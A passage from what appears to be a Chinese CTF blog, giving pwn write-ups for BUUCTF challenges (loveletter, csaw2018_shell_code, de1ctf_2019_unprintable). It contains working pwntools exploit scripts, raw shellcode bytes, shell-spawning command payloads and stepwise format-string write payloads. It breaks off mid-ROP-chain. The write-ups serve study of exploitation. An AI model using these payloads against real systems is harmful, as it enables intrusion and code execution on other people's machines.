<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span>*</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p,e,libc=load(<span class="string">&quot;loveletter&quot;</span>)</span><br><span class="line"><span class="comment"># payload=b&#x27;nv sh -c sh&#x27;</span></span><br><span class="line"><span class="comment"># payload+=b&#x27;a&#x27;*(0xfd-40+2)+b&#x27;;&#x27;*10+p32(1)</span></span><br><span class="line"><span class="comment"># payload=&#x27;nv sh -c sh &#x27;</span></span><br><span class="line"><span class="comment"># payload+=&#x27;a&#x27;*(0xfd-12)+&#x27;;&#x27;+&#x27;\x01&#x27;</span></span><br><span class="line">payload=<span class="string">&#x27;cat flag &#x27;</span><span class="comment">#csh -c sh </span></span><br><span class="line">payload+=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0xfd</span>-<span class="number">12</span>+<span class="number">3</span>)+<span class="string">&#x27;;&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">debug(p,<span class="number">0x08048833</span>,<span class="number">0x0804874A</span>,<span class="number">0x08048935</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>buu</code> 这道题的远程环境出问题了，<code>nc</code> 上去就是 <code>shell</code> 。所以这里打本地演示了</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240312081758301.png" alt="image-20240312081758301"></p>
<h2 id="csaw2018-shell-code"><a href="#csaw2018-shell-code" class="headerlink" title="csaw2018_shell_code"></a>csaw2018_shell_code</h2><p>保护检测这个 <code>NX</code> 很奇怪，<code>gdb</code> 进去用 <code>vmmap</code> 看了一下，发现 <code>NX</code> 是关的，栈里数据可以执行。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240312102723041.png" alt="image-20240312102723041"></p>
<p>主逻辑向栈中两个变量分别输入 <code>15</code> 个字节的数据</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240312102806457.png" alt="image-20240312102806457"></p>
<p>然后在 <code>printNode</code> 函数中会泄露一个栈地址</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240312102851284.png" alt="image-20240312102851284"></p>
<p><code>goodbye</code> 函数中存在栈溢出。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240312102911597.png" alt="image-20240312102911597"></p>
<p>打法有很多，不管是拼接两段的 <code>shellcode</code> 还是打 <code>shellcode</code> 去调用 <code>read</code> 二次读入一个 <code>shellcode</code> ，或者直接调用 <code>execve</code> ？（没有试）</p>
<p>总之就是一个很基础的 <code>ret2shellcode</code> ，八仙过海各显神通吧</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span>*</span><br><span class="line">p,e,libc=load(<span class="string">&quot;shellpointcode&quot;</span>,<span class="string">&quot;node5.buuoj.cn:29605&quot;</span>)</span><br><span class="line">payload=<span class="string">&quot;\x31\xFF\x4C\x89\xDA\x48\x89\xE6\x31\xC0\x0F\x05&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">xor edi,edi</span></span><br><span class="line"><span class="string">mov rdx,r11</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;(15 bytes) Text for node 1:  &#x27;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;(15 bytes) Text for node 2: &quot;</span>,<span class="string">&#x27;\x00\x01&#x27;</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x8E7</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;node.next: &#x27;</span>)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;stack_addr&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">3</span>+p64(<span class="number">0xdeadbeef</span>)+p64(stack_addr+<span class="number">0x28</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x34</span>+shellcode_store(<span class="string">&#x27;shell_64&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240312103210949.png" alt="image-20240312103210949"></p>
]]></content>
      <categories>
        <category>buu刷题</category>
      </categories>
  </entry>
  <entry>
    <title>BUUCTF_de1ctf_2019_unprintable</title>
    <url>/posts/d34ee684.html</url>
    <content><![CDATA[<blockquote>
<p>通过这道题的学习与收获有：</p>
<p>1、bss段的格式化字符串，需要找一条栈链，需要用栈地址-&gt;栈地址-&gt;栈地址-&gt;值，用第二个栈地址来控制第三个栈地址，将第三个栈地址当做跳板，最终去通过跳板的不断移动，去不断写入一或两字节的数据。<br>这里稍稍总结两句。<br>利用格式化字符漏洞来达到写的目的，分为两种情况。<br>如果输入直接是在栈中，那就可以去利用距栈顶偏移加我们构造地址，去达到任意地址任意写的目的。<br>如果输入是在bss段，那么要利用栈链，来进行任意地址任意写。</p>
<p>2、这道题的思路是一边利用格式化字符串漏洞去不断执行printf和read，一边在栈里写入bss段地址，为之后的栈迁移做打算。最后将布置好的rop链发送过去，让执行流迁移到rop链上，利用magic gadget来获取shell。</p>
<p>3、又收集到了一个新的magic gadget。adc    DWORD PTR [rbp+0x48],edx    机器码搜11554889</p>
<p>4、第一次遇见格式化字符函数自己修改自己的返回地址去执行自己… 另外就是格式化字符并不需要对齐，格式化字符后面的地址才需要对齐。</p>
<p>5、多注意栈里的数据，是否有特殊的存在。没思路的时候，就调试一下看看能不能找到有用的信息。</p>
</blockquote>
<span id="more"></span>



<h2 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h2><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018008.png"></p>
<h2 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h2><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018009.png"></p>
<p>程序很短，这题很简单？</p>
<p>hh，继续往下看吧。</p>
<p>程序就四个点，第一是程序自己泄露个栈地址</p>
<p>第二是close关闭了标准输出，如果不过仅仅是关闭了一个文件描述符，只要能获取shell的话，重定向一下文件描述符就ok了。</p>
<p>第三是有个格式化字符漏洞的点，同时这道题溢出给的超大（并且是输入到bss段）。</p>
<p>第四是程序没有return，格式化字符函数利用完之后，程序就exit了。</p>
<p>首先猜测泄露的栈地址应该是要配合格式化字符函数使用的，close只关闭了一个文件描述符，只要能获取shell的话，这个点也好处理。最困难的点是print后面紧接着就是exit了，因此去用print来修改main函数的返回地址以劫持执行流肯定是行不通的了，至此卡死…</p>
<h2 id="尝试一下调试"><a href="#尝试一下调试" class="headerlink" title="尝试一下调试"></a>尝试一下调试</h2><h3 id="先patch一下"><a href="#先patch一下" class="headerlink" title="先patch一下"></a>先patch一下</h3><p>先patch一下libc和ld，这道题是2.23的libc，查看方法如下。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018010.png"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018011.png"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018012.png"></p>
<p>然后下载对应的libc，patch一下即可。（这道题我看了一下发现是2.23的，就直接用glibc-all-in-one里的2.23libc了，结果最后导致小版本不同，本地打通了，远程没通，因此下回直接patch buu上给的libc即可）</p>
<p><a href="(https://www.cnblogs.com/ZIKH26/articles/16044588.html)">如何patch，我这篇博客有提到</a></p>
<h3 id="初步调试"><a href="#初步调试" class="headerlink" title="初步调试"></a>初步调试</h3><p>首先明确一下我们想看什么，我们现在什么也不知道，但是打算去看一下栈里的情况碰碰运气<strong>（栈中情况如下）</strong>。不过格式化字符函数之前的栈一律不用看（因为我们利用不了）。</p>
<p>基本上感觉看不出来什么，如果非要说个不一样的，那就发现有个栈里的内容颜色和其他的不一样。（此时是即将执行格式化字符函数时）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018013.png"></p>
<p>用vmmap看一下，发现这个地址是位于ld.so中的，这个地址有点奇怪，不过依然不知道这里有什么用。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018014.png"></p>
<p>不过根据经验来看，似乎是要劫持exit里的某个hook？因为之前也遇见过一道类似这种手法的题目。</p>
<p>si进入exit里面看看。</p>
<p>经过漫长的si之后，终于在dl_fini+250处执行之后，此时的栈里，居然出现了刚才的那个奇怪地址<strong>（栈中情况如下）</strong></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018015.png"></p>
<p>继续又si了很久，发现此时call了一下，我们溯源一下r12寄存器的值（rdx就不用管了，因为本身自己就为0了）。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018016.png" alt="image-20220419094811717"></p>
<p>往上翻了几步发现，r12的值是自身的值加上了rbx所指向的内容。(我们可以控制rbx所指向的内容，但是控制不了原本的r12)</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012021587.png" alt="image-20230701202109352"></p>
<h3 id="解决exit的退出问题"><a href="#解决exit的退出问题" class="headerlink" title="解决exit的退出问题"></a>解决exit的退出问题</h3><h4 id="重新梳理一下当前信息："><a href="#重新梳理一下当前信息：" class="headerlink" title="重新梳理一下当前信息："></a>重新梳理一下当前信息：</h4><p>1、栈里有个位于ld.so中的地址，我们可以利用格式化字符串漏洞修改这个地址所指向的值（但是修改不了这个位于ld.so地址）。<strong>（因为格式化字符串漏洞想要修改某个值，就必须去找到指向这个值的地址利用相对栈顶偏移完成修改）</strong>。</p>
<p>2、程序最后调用了<code>exit</code>中的<code>__run_exit_handlers</code>函数中的<code>_dl_fini</code>中的一个call ptr[r12+rdx*8]   而r12就是那个**位于ld.so中的地址所指向的值(不修改的话，默认为0)**加了0x600dd8。</p>
<h4 id="我们当下的目的是什么？"><a href="#我们当下的目的是什么？" class="headerlink" title="我们当下的目的是什么？"></a>我们当下的目的是什么？</h4><p>劫持程序执行流，不让其触发exit导致程序结束，并且让执行流去重新执行read以及printf（不能返回到main函数，不然会重新初始化栈空间），因为程序的漏洞点只有这一个，因此只能劫持到这里。</p>
<h4 id="怎么做？"><a href="#怎么做？" class="headerlink" title="怎么做？"></a>怎么做？</h4><p>由于call后面加了个ptr，因此r12最后的值应该让它去指向这里<br><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018017.png"></p>
<p>采用策略是将0x4007A3布置到bss段，然后让r12的值为指向0x4007A3的地址(也就是bss段地址)。</p>
<h4 id="对应payload"><a href="#对应payload" class="headerlink" title="对应payload"></a>对应payload</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x298</span>)+<span class="string">&#x27;c%26$hn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">16</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(read_print_addr)<span class="comment">#这个地址要放在最后，如果放在payload最开始</span></span><br><span class="line"><span class="comment">#p64打包产生的00会将格式化字符函数截断，导致后面布置的格式化字符无法被解析</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>

<p>关于payload解释如下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018018.png"></p>
<p>此处距离栈顶偏移20，再加上6个寄存器，偏移为26。</p>
<p>payload从0x601060开始输入，把格式化字符部分填充为16个字节，因此0x601070装的是0x4007A3。<strong>在__dl__fini中执行add的时候r12原本的值为0x600dd8</strong>。因此需要将rbx所指向的值修改为0x298(0x601070-0x600dd8) ，这样才能让最后call的时候r12为0x601070。</p>
<h3 id="如何多次任意写？"><a href="#如何多次任意写？" class="headerlink" title="如何多次任意写？"></a>如何多次任意写？</h3><p>现在确实是又返回到了read函数，我们的思路应该是写个rop链在bss段，然后想办法让执行流迁移过去。具体细节先不想那么多，但是一次printf肯定是不行的，那怎么办？光想的话，我也不知道怎么办…    那就继续调试，看看此时栈里有没有可用利用的地方</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018019.png"></p>
<p>可以发现栈里此时多了很多指向栈本身的指针，最值得关注的是红框的那个地方。这个栈地址是指向当前栈顶的上一个内存单元，这意味着如果执行printf的话，那printf的返回地址将被存放到这个内存单元（如下图）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018020.png"></p>
<p>此时的这个0x4007c6就是printf的返回地址了。</p>
<p>所以我们就可以… <strong>用printf修改printf的返回地址以便让执行流继续执printf</strong>！！</p>
<p>（这个想法听起来有点小疯狂，但是确实可以实现，<strong>这样做的前提是栈中必须存放着一个栈地址，并且这个栈地址指向了当前函数的返回地址</strong>）</p>
<h4 id="半成品payload"><a href="#半成品payload" class="headerlink" title="半成品payload"></a>半成品payload</h4><p>所以这里的半成品payload是这样的（0xa3是read的地址的末字节，偏移23就不再数了）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br></pre></td></tr></table></figure>

<p>之所以是半成品，是因为执行了这个之后我们仅仅只是返回到了printf，但事实上我们需要再干点别的事情（因为单纯的无限执行printf是没有意义的）</p>
<h2 id="题目整体大致思路："><a href="#题目整体大致思路：" class="headerlink" title="题目整体大致思路："></a>题目整体大致思路：</h2><p>此时再捋一下获取shell的思路。</p>
<p>1、你想尝试泄露函数地址，去libc里搜system？   close(1)直接打消了这条路 （因为执行打印函数是无法泄露出来内容的）</p>
<p>2、在不知道libc基址的情况下，目前我能想到的方法只有去利用magic_gadget来修改一个got表了。</p>
<p>3、想利用magic_gadget就肯定是需要专门控制寄存器，采用的手法肯定要是ret2csu。但是想利用ret2csu中的pop去控制各个寄存器，就意味着我们能够控制栈中的数据，可事实上我们输入的内容全都跑到bss段了。（如果利用格式化字符函数把数据全部布置到栈上是不现实的）因此采用的对抗策略是迁移栈到bss段。</p>
<p>4、这道题迁移栈和以往的栈迁移不一样，以往的栈迁移是可控的栈地址很少，因此装个leave；ret，但事实上这道题我们压根就无法输入内容到栈上。考虑下栈迁移的本质是什么？ 控制rsp寄存器。搜一下gadget看看？</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018021.png" alt="image-20220419121807276"></p>
<p>发现是存在pop rsp的。</p>
<p>5、至此思路已经很清晰了，用pop rsp来改变栈到bss段，然后布置rop链到bss段。不过在此之前我们需要将pop rsp布置到bss地址的上面紧挨着的内存单元(因为pop弹的就是下一个内存单元的值给rsp)。</p>
<p>而pop rsp最终怎么被执行？只能是将print的返回地址改成pop rsp的地址</p>
<blockquote>
<p><strong>最终得出结论：</strong> 我们要一边劫持printf进行多次格式化字符串漏洞的利用，一边要去将print返回地址下面的内存单元改成bss地址，改写完成后，最后一次payload去将print的返回地址改写成pop rsp地址，并且将rop链发送到bss段上。</p>
</blockquote>
<p>接下来的内容分为两部分，第一部分是如何一点一点在栈上写入bss段地址，第二部分为rop链的构造。</p>
<h2 id="栈链的布置"><a href="#栈链的布置" class="headerlink" title="栈链的布置"></a>栈链的布置</h2><p>首先明确两件事情，我们修改地址无法用$n一次性将整个内容全部写入(因为字符数量太多将导致传输异常）因此我们最多只能一次写两字节($hn)或是一次写一字节($hhn)。</p>
<p>第二件事，就是使用格式化字符串任意写的时候，是利用相对栈顶偏移写入数据，数据写到了相对于栈顶偏移这个指针所指向的内存。</p>
<p>以<code>%100c%9$hn</code>为例。它的意思是<strong>说将100写入距离栈顶偏移为9所指向的位置</strong>（如下图）。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018022.png"><br><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018023.png"></p>
<p>这两张图片可以体现出上面所说的，<strong>就是栈中数据必须是个地址，才能通过它修改它指向的那个位置</strong>。（0x112233变成0x112264是因为100的十六进制是64）</p>
<blockquote>
<p>现在需要在一个大小为八字节的内存单元中用一次写入两字节的方法凭空写一个bss段地址，如何做？</p>
</blockquote>
<p>我们似乎要去找一个栈地址a，这个栈地址a指向的内容也要是个栈地址b，然后我们就可以去往栈地址b所指向的那个内存单元里写入一个bss段地址了，就跟上面那两张图片一样？</p>
<p>但是似乎出现了点问题，因为我们只能一次写入两字节，而要写入bss段地址的同时还要将这个内存单元中没有用的部分将其设置为0。如果再按照上面两个图片的方法去写入，我们永远只能去修改那一个字节的部分。</p>
<p>因此产生的策略是，我们用三个指针来完成写入bss地址这件事。直接上图片</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018024.png"></p>
<p>现在假设a,b,c全部都为栈地址，而d的值为0xffffffffffffffff，我们最终的目的是将d修改为0x601060。</p>
<blockquote>
<p> 我们先看最后一行的三个指针，如果现在有个格式化字符串漏洞的话，我们是可以拿到b距离栈顶偏移，然后通过b去修改c的值。然后还可以看第二行，拿到c相对栈顶偏移，通过c去修改d的值。而我们每次只能写入两个字节，也就是说第一次只能通过c来将d修改为0xffffffffffff1060。然后我们再去第三行，通过b来修改c的值，把c改成c+2，接着再回到第二行，通过c来修改d的值，这次我们将d可以改成0xffffffff00601060。依次类推（把前面的ff全部改成0），我们靠移动c指针的位置，来改变我们写入d的位置，尽管一次是写入两个字节，但是最终依旧可以达到在一个内存单元中写出一个完整的地址。</p>
</blockquote>
<p>思路重新回到这个题目，执行完第一个payload之后，栈里的情况（如下图）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018025.png" alt="image-20220419144015357"></p>
<p>现在我们要做的就是在栈里写一个bss段地址（本题写的bss段地址是0x601088，这个地址刚开始是不知道的，我们可以先随便写个地址，最后通过调试去把这个正确的地址进行重新修正）</p>
<p>上图中标注的①，②，③其实就对应我演示的那个图片。还记得上文提到的一个半成品payload么，其实就是④，printf将修改它自己的返回地址。</p>
<p>下面来展示下payload，以及修改前后的栈（变化前后的地方已用红框标注）（修改原理上面已经介绍过了）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hook_addr=((leak_stack_addr-<span class="number">0x118</span>)&amp;<span class="number">0xff</span>)<span class="comment">#泄露的栈地址距离返回地址下面的那个内存单元的地址偏移为0x118</span></span><br><span class="line"><span class="keyword">if</span> hook_addr&gt;<span class="number">0xa3</span>:</span><br><span class="line">    judge=<span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    judge=<span class="number">2</span></span><br><span class="line"><span class="comment">#if进行判断是因为，我们并不知道hook_addr和0xa3谁大，因此需要应对这两种情况</span></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">1</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr-<span class="number">0xa3</span>)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">2</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-hook_addr)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>

<p>修改前：</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018026.png" alt="image-20220419175618585"></p>
<p>修改后：</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018027.png" alt="image-20220419191555739"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x1088</span>-<span class="number">0xa3</span>)+<span class="string">&#x27;c%13$hn&#x27;</span><span class="comment">#去写入低二字节0x1088</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>

<p>修改前：</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018028.png" alt="image-20220419175849476"></p>
<p>修改后：</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018030.png" alt="image-20220419191955052"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#开始移动 指向bss段指针，方便第二次的写入bss段</span></span><br><span class="line">hook_addr=hook_addr+<span class="number">0x2</span><span class="comment">#将指向bss段的指针抬高两字节</span></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">1</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr-<span class="number">0xa3</span>)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">2</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-hook_addr)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>

<p>修改前：</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018031.png" alt="image-20220419180744259"></p>
<p>修改后：</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018032.png" alt="image-20220419180954716"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x60</span>)+<span class="string">&#x27;c%13$hn&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-<span class="number">0x60</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>

<p>修改前：</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018033.png" alt="image-20220419182535080"></p>
<p>修改后：</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018034.png" alt="image-20220419183311175"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hook_addr=hook_addr+<span class="number">0x2</span><span class="comment">#继续将指向bss段的指针抬高两字节</span></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">1</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr-<span class="number">0xa3</span>)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">2</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-hook_addr)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>

<p>修改前：</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018035.png" alt="image-20220419184908968"></p>
<p>修改后：</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018036.png" alt="image-20220419185253367"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&#x27;%13$hn&#x27;</span>  <span class="comment">#这个的意思是写入两字节的0给栈顶偏移13指向的位置</span></span><br><span class="line">payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x082d</span>)+<span class="string">&#x27;c%23$hn&#x27;</span> <span class="comment">#这个等下再说</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>

<p>修改前：</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018037.png" alt="image-20220419204052994"></p>
<p>修改后：</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018038.png" alt="image-20220419204804195"></p>
<p>至此我们已经达到想要的效果了，也就是将printf返回地址下面的那个内存单元写成bss段地址。</p>
<p>接下来我们就不用printf再返回去执行read了，我们去执行pop rsp</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018039.png" alt="image-20220419205614827"></p>
<p>只需去改变返回地址的最后两字节即可。(payload如下)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x082d</span>)+<span class="string">&#x27;c%23$hn&#x27;</span></span><br></pre></td></tr></table></figure>

<p>至此，前面的工作全部完成，已经可以去迁移到我们指定的bss段了。接下来就是rop链的构造，不过在此之前还是需要介绍一下magic gadget</p>
<h3 id="介绍一下magic-gadget"><a href="#介绍一下magic-gadget" class="headerlink" title="介绍一下magic_gadget"></a>介绍一下magic_gadget</h3><h4 id="一个新的magic-gadget"><a href="#一个新的magic-gadget" class="headerlink" title="一个新的magic_gadget"></a>一个新的magic_gadget</h4><p>关于magic_gadget详细解释，我写在了这篇博客上  <a href="https://www.cnblogs.com/ZIKH26/articles/16193814.html">here</a></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018040.png" alt="image-20220419132940571"></p>
<p>我以前用的magic gadget是这个 add    DWORD PTR [rbp-0x3d], ebx  但这道题搜对应的机器码搜不到了…  不过官方放出了另一个gadget </p>
<p>adc    DWORD PTR [rbp+0x48],edx</p>
<p>这个的效果是和之前那个magic gadget效果一样。我们只需要利用csu片段控制一下寄存器rbp和edx的值，就可以达到修改的目的。<strong>具体方法为 rbp中装入stderr指针（因为它本身就存在于libc库中），edx中放入libc中stderr与one_gadget的偏移。</strong></p>
<p>为什么要放stderr？因为标准输入和标准输出我们肯定是不能改，然后我本来是想放个没用函数的got地址，然后给修改了。但是我用pwndbg输入got之后没有把got表给展示出来…</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018041.png" alt="image-20220419140734080"></p>
<p>那就用这个stderr来当做个跳板吧</p>
<h4 id="如何寻找这个新的magic-gadget"><a href="#如何寻找这个新的magic-gadget" class="headerlink" title="如何寻找这个新的magic gadget"></a>如何寻找这个新的magic gadget</h4><p>ROPgadget –binary a –opcode 11554889       （直接搜这个gadget的机器码）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018042.png" alt="image-20220416151801735"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018043.png" alt="image-20220416151836813"></p>
<h2 id="rop链的构造"><a href="#rop链的构造" class="headerlink" title="rop链的构造"></a>rop链的构造</h2><p>构造rop链之前，我们要考虑一下我们需要怎么做。</p>
<p>因为无法泄露libc基址，只能利用magic gadget去将stderr修改为one_gadget地址。控制参数使用csu片段，最后利用里面的call ptr去执行stderr，然后获取shell。</p>
<p>说写就写，首先我们当时是执行了一个pop rsp，但是后面还pop了三个寄存器</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018039.png" alt="image-20220419205614827"></p>
<p>因此迁移过来的时候，先填充三个垃圾数据。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>然后装入csu片段的地址,此时我们先控制rdx的值，如果现在控制rbp的话，cmp     rbx, rbp这个检查不好过。因此我们先把rbx和rbp设置成0和1，然后我们此时并不需要执行call ptr r12，因此r12这里放一个空函数（指向term_proc函数的地址，因为call的时候是ptr）暂时的payload如下</p>
